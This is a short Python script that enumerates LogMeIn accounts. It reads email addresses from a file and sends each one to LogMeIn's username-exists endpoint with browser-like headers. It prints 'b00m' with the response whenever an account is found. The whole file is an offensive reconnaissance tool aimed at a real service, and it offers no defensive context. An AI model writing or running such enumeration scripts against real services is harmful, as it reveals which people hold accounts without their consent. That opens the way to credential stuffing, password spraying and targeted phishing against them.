import requests
import urllib
import json

def smash(email):
    ret = False
    url = 'https://accounts.logme.in/auth/v1/usernameexists'
    payload = {"username":"{}".format(email),"client_id":"LMI.Sitecore"}
    headers = {'Content-Type': 'application/json',
               'Content-Length': '{}'.format(len(json.dumps(payload))),
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate, br',
               'Referer':'https://www.logmein.com/try-access',
               'Origin':'https://www.logmein.com',
               'Connection':'keep-alive',
               'TE':'Trailers'}

    r = requests.post(url, data=json.dumps(payload), headers=headers).json()
    if r['exists'] == True:
        return r
    else:
        return ret

    return ret



with open("emailaddrs.txt", "r") as fd:
    for line in fd:
        email = line.strip()
        ret = smash(email)
        if ret:
            print("b00m {} {}".format(email,ret))
